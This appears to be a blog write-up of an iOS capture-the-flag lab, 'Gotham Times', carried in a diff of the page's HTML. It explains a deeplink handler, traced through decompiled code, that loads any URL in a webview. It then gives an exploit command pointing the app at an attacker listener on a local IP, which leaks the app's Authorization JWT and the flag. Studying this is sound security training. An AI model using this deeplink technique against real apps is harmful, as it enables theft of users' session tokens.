+<span class="w">          </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_318</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_328</span><span class="p">);</span>
+<span class="w">          </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_340</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">_swift_bridgeObjectRelease</span><span class="p">(</span><span class="n">local_2e0</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_260</span><span class="p">);</span>
+<span class="w">      </span><span class="n">in_x3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pcVar21</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">$$outlined_destroy_of_Swift</span><span class="p">.</span><span class="n">Set</span><span class="o">&lt;&gt;</span><span class="p">.</span><span class="n">Iterator</span><span class="p">(</span><span class="n">auStack_a0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">_objc_release</span><span class="p">(</span><span class="n">local_210</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>This method perform the following operations:</p>
+<ul>
+<li><strong>URL Processing</strong>: When the app receives a URL to open like <code>gothamtimes://something</code>, this method gets called.</li>
+<li><strong>Checks for URLs with the host "open"</strong> like<code>gothamtimes://open/...</code></li>
+<li><strong>Extracts URL Parameter</strong>:If the host matches "open", it calls <code>getQueryStringParameter</code> to extract a URL parameter named "url", like <code>gothamtimes://open?url=http://shomething</code></li>
+<li><strong>Open the URL</strong> in a <code>WKWebView</code> .</li>
+</ul>
+<p>Therefore, based on the decompiled code, the deeplink format that the application is expecting is the following: <code>gothamtimes://open?url=&lt;target url&gt;</code>.</p>
+<h2 id="solution">Solution</h2>
+<p>The following deeplink is executed; the <code>url</code> parameter points to an attacker-controlled server on which has been preemptively setup a listener on port <code>8000</code>.</p>
+<div class="highlight"><pre><span></span><code>uiopen<span class="w"> </span><span class="s1">'gothamtimes://open?url=http://192.168.1.182:8000'</span>
+</code></pre></div>
+<p><img alt="gotham-times-solution-1.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-solution-1.png"/></p>
+<p><img alt="gotham-times-app-6.jpg" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-app-6.jpg"/></p>
+<p>The application processes the deeplinks and opens a webview on the provided url; on the attacker listener, the following headers are received, leaking the <code>Authorization</code> JWT token and the flag:</p>
+<p><img alt="gotham-times-solution-2.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-solution-2.png"/></p>
+<h2 id="extended-analysis">Extended Analysis</h2>
+<p>By looking  to the <code>Info.plist</code>'s <code>UIApplicationSceneManifest</code> property, it's possible to statically identify the deeplink handler without need of <code>frida-trace</code>:</p>
+<p><img alt="gotham-times-static-2.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/gotham-times/gotham-times-static-2.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
